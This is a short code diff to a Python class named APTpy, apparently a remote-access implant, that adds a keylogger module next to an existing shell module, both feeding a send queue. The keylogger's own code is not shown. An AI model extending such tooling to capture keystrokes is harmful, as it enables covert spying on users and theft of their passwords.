@@ -117,10 +117,13 @@ class APTpy:
 
     def _registerModules(self):
         from lib.modules.shell import ShellModule
+        from lib.modules.keylogger import KeyloggerModule
 
         self.events['ShellModule'] = Event()
         self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))
 
+        self.events['KeyloggerModule'] = Event()
+        self.modules.append(KeyloggerModule(self.queue_send, self.events['KeyloggerModule']))
 try:
     obj = APTpy()
     obj.run()
